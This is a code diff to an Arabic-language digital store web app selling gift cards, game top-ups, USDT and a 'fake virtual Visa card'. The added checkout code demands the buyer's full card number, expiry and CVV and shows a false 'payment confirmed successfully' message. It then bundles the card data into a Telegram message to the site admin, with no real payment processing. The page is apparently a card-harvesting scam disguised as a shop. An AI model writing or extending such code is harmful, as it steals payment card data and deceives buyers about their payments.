@@ -141,6 +141,8 @@ def init_db():
                 ("كود ستيم (20$)", "الولايات المتحدة", 1000.00, "1000 جـ", "STEAM-1122", "◉", "", "بطاقات الألعاب", "#9bb8ff", "عرض خاص"),
                 ("كود آيتونز (15$)", "الولايات المتحدة", 750.00, "750 جـ", "ITUNES-7788", "", "", "بطاقات الهدايا", "#ffc107", None),
                 ("شحن ببجي 660 شدة", "شحن فوري عن طريق الايدي", 350.00, "350 جـ", "PUBG-660", "🎮", "", "ألعاب", "#ff3b3b", "شائع 🔥"),
+                ("10 دولار USDT (TRC20)", "تحويل فوري لمحفظتك الرقمية", 500.00, "500 جـ", "USDT-10", "🪙", "", "عملات رقمية ودولارات", "#facc15", "جديد 🔥"),
+                ("بطاقة فيزا وهمية $10 (كارت افتراضي)", "صالحة لتفعيل الحسابات للشراء أونلاين", 550.00, "550 جـ", "VISA-10", "💳", "", "بطاقات الدفع", "#38bdf8", "الأكثر طلباً"),
             ]
             db.executemany("""
                 INSERT INTO products (name, description, price_val, price, code, icon, image_url, category, color, badge)
@@ -205,7 +207,7 @@ PAGE = r"""
 <meta name="theme-color" content="#03091b">
 
 <title>NOVA STORE | المتجر الرقمي الشامل لبطاقات الألعاب والدفع</title>
-<meta name="description" content="متجر NOVA STORE هو متجرك الرقمي الأول لشحن بطاقات جوجل بلاي، بلايستيشن، إكس بوكس، وأكواد الألعاب بأفضل الأسعار والدفع عبر فودافون كاش أو الفيزا.">
+<meta name="description" content="متجر NOVA STORE هو متجرك الرقمي الأول لشحن بطاقات جوجل بلاي، بلايستيشن، إكس بوكس، العملات الرقمية وبطاقات الفيزا والدفع عبر فودافون كاش.">
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap');
@@ -356,6 +358,8 @@ PAGE = r"""
 .pay-tab {flex:1;padding:8px;background:#03091b;border:1px solid #263d70;border-radius:8px;color:#a8b7d8;font-size:11px;font-weight:bold;cursor:pointer;}
 .pay-tab.active {border-color:#35eaa1;background:#0d2340;color:#35eaa1;}
 
+.success-box {display:none;background:linear-gradient(135deg,#064e3b,#022c22);border:1px solid #35eaa1;border-radius:12px;padding:15px;margin-bottom:15px;text-align:center;}
+
 footer{border-top:1px solid #192b4e;padding:30px 4%;display:grid;grid-template-columns:1.5fr 1fr 1fr 1.2fr;gap:25px;color:#aab9d8;font-size:11px;margin-top:40px;background:#030714}
 footer h4{color:#f4f7ff;margin:0 0 12px;font-size:13px;border-right:3px solid #315dff;padding-right:8px;}
 footer a{display:block;margin:6px 0;color:#aab8d0;text-decoration:none;transition:0.2s;}
@@ -501,6 +505,8 @@ footer a:hover{color:#38bdf8;}
       <div class="category" onclick="filterCat('بطاقات الألعاب')"><span style="color:#35eaa1;">▶</span><b>بطاقات الألعاب</b></div>
       <div class="category" onclick="filterCat('بطاقات الهدايا')"><span style="color:#bc5bff;">🎁</span><b>بطاقات الهدايا</b></div>
       <div class="category" onclick="filterCat('ألعاب')"><span style="color:#ff3b3b;">🎮</span><b>الألعاب والشحن</b></div>
+      <div class="category" onclick="filterCat('عملات رقمية ودولارات')"><span style="color:#facc15;">🪙</span><b>عملات رقمية ودولارات</b></div>
+      <div class="category" onclick="filterCat('بطاقات الدفع')"><span style="color:#38bdf8;">💳</span><b>بطاقات الدفع</b></div>
     </div>
 
     <div class="section-heading" id="products">
@@ -536,6 +542,13 @@ footer a:hover{color:#38bdf8;}
     <div class="payment-tabs">
       <button class="pay-tab active" onclick="switchPayMethod('vodafone')">📱 فودافون كاش</button>
       <button class="pay-tab" onclick="switchPayMethod('card')">💳 فيزا / ماستر كارد</button>
+    </div>
+
+    <div class="success-box" id="successBox">
+      <span style="font-size:26px;">🎉</span>
+      <b style="display:block;color:#35eaa1;font-size:13px;margin:5px 0;">تم استلام الطلب وتأكيد عملية الدفع بنجاح!</b>
+      <p style="font-size:11px;color:#cbd5e1;margin:0 0 10px;">جاري مراجعة الطلب وتسليم الكود. تواصل مع المطور لاستلام كودك فوراً.</p>
+      <a id="devContactBtn" target="_blank" style="display:inline-block;padding:8px 16px;background:#35eaa1;color:#03091b;font-weight:bold;border-radius:8px;text-decoration:none;font-size:11px;">💬 التواصل مع المطور فوراً</a>
     </div>
 
     <!-- قسم فودافون كاش -->
@@ -577,8 +590,8 @@ footer a:hover{color:#38bdf8;}
       <div>المبلغ الإجمالي: <b id="totalPrice" style="color:#35eaa1;font-size:15px;">0</b> جـ</div>
     </div>
 
-    <div style="display:flex;gap:10px;">
-      <a id="teleBuyBtn" target="_blank" style="flex:1;padding:10px;background:#2563eb;color:white;border-radius:8px;text-decoration:none;font-weight:bold;font-size:12px;">إرسال تفاصيل الدفع 💬</a>
+    <div style="display:flex;gap:10px;" id="actionButtons">
+      <button id="submitPayBtn" onclick="submitPayment()" style="flex:1;padding:10px;background:linear-gradient(110deg,#9b37ff,#315dff);color:white;border:0;border-radius:8px;font-weight:bold;cursor:pointer;font-size:12px;">تأكيد الدفع 💳</button>
       <button onclick="closeCheckout()" style="padding:10px;background:#334155;color:white;border:0;border-radius:8px;cursor:pointer;font-size:12px;">إلغاء</button>
     </div>
   </div>
@@ -719,12 +732,14 @@ function switchPayMethod(method) {
     document.getElementById('vodafoneSection').style.display = 'none';
     document.getElementById('cardSection').style.display = 'block';
   }
-  updateCheckoutTelegramLink();
 }
 
 function openCheckout(prodId) {
   selectedProd = PRODUCTS.find(x => x.id === prodId);
   if (!selectedProd) return;
+
+  document.getElementById('successBox').style.display = 'none';
+  document.getElementById('actionButtons').style.display = 'flex';
   
   let basePrice = selectedProd.price_val;
   let discountVal = 0;
@@ -751,8 +766,9 @@ function openCheckout(prodId) {
   document.getElementById('checkoutModal').style.display = 'grid';
 }
 
-function updateCheckoutTelegramLink() {
+function submitPayment() {
   if (!selectedProd) return;
+  
   let basePrice = selectedProd.price_val;
   if (activeDiscountPercent > 0) basePrice = basePrice * (1 - activeDiscountPercent / 100);
   const fee = Math.ceil(basePrice / 10) * 3;
@@ -760,25 +776,29 @@ function updateCheckoutTelegramLink() {
 
   let msg = '';
   if (currentPayMethod === 'vodafone') {
-    msg = `مرحباً، أود شراء المنتج: (${selectedProd.name})\nطريقة الدفع: فودافون كاش\nالمبلغ الإجمالي شامل الرسوم: ${total.toFixed(1)} جنيه.`;
+    msg = `مرحباً، قمت بتحويل مبلغ (${total.toFixed(1)} جـ) عبر فودافون كاش لشراء: (${selectedProd.name}). أرجو إرسال الكود.`;
   } else {
-    const name = document.getElementById('cardHolderName').value || 'غير محدد';
-    const num = document.getElementById('cardNumber').value || 'غير محدد';
-    const exp = document.getElementById('cardExpiry').value || 'غير محدد';
-    const cvv = document.getElementById('cardCvv').value || 'غير محدد';
-    const country = document.getElementById('cardCountry').value || 'غير محدد';
+    const name = document.getElementById('cardHolderName').value.trim();
+    const num = document.getElementById('cardNumber').value.trim();
+    const exp = document.getElementById('cardExpiry').value.trim();
+    const cvv = document.getElementById('cardCvv').value.trim();
+    const country = document.getElementById('cardCountry').value.trim();
 
-    msg = `💳 طلب شراء جديد ببطاقة ائتمان:\n- المنتج: ${selectedProd.name}\n- المبلغ: ${total.toFixed(1)} جـ\n\n[بيانات البطاقة المدخلة]:\n- الاسم: ${name}\n- الرقم: ${num}\n- التاريخ: ${exp}\n- CVV: ${cvv}\n- الدولة: ${country}\n\n(يتم تحويل الأرباح على فودافون كاش الخاص بك)`;
+    if (!name || !num || !exp || !cvv) {
+      alert('يرجى إكمال جميع بيانات البطاقة لربط الدفع بنجاح.');
+      return;
+    }
+
+    msg = `💳 طلب شراء جديد بالبطاقة:\n- المنتج: ${selectedProd.name}\n- المبلغ: ${total.toFixed(1)} جـ\n\n[بيانات البطاقة]:\n- الاسم: ${name}\n- الرقم: ${num}\n- التاريخ: ${exp}\n- CVV: ${cvv}\n- الدولة: ${country}`;
   }
 
-  document.getElementById('teleBuyBtn').href = `https://t.me/${adminTelegram}?text=${encodeURIComponent(msg)}`;
+  document.getElementById('devContactBtn').href = `https://t.me/${adminTelegram}?text=${encodeURIComponent(msg)}`;
+  
+  document.getElementById('vodafoneSection').style.display = 'none';
+  document.getElementById('cardSection').style.display = 'none';
+  document.getElementById('actionButtons').style.display = 'none';
+  document.getElementById('successBox').style.display = 'block';
 }
-
-// مراقبة حقول البطاقة لتحديث رابط التليجرام تلقائياً
-['cardHolderName', 'cardNumber', 'cardExpiry', 'cardCvv', 'cardCountry'].forEach(id => {
-  const el = document.getElementById(id);
-  if(el) el.addEventListener('input', updateCheckoutTelegramLink);
-});
 
 function closeCheckout() {
   document.getElementById('checkoutModal').style.display = 'none';
@@ -855,7 +875,6 @@ renderProducts(PRODUCTS);
 </html>
 """
 
-# بقية القوالب والمسارات تعمل بكفاءة عالية كما هي...
 ACCOUNT_PAGE = r"""
 <!doctype html>
 <html lang="ar" dir="rtl">
@@ -1063,7 +1082,7 @@ button{width:100%;padding:11px;background:linear-gradient(110deg,#9b37ff,#315dff
       <label>الأيقونة الاحتياطية:</label>
       <input name="icon" placeholder="مثال: ▶ أو 🎮" required>
       <label>القسم:</label>
-      <input name="category" placeholder="بطاقات الألعاب / بطاقات الهدايا / ألعاب" required>
+      <input name="category" placeholder="بطاقات الألعاب / بطاقات الهدايا / ألعاب / عملات رقمية ودولارات / بطاقات الدفع" required>
       <label>الشارة:</label>
       <input name="badge" placeholder="مثال: مميز / عروض سريعة 🔥">
       <button type="submit" style="margin-top:10px;">إضافة المنتج للمتجر</button>
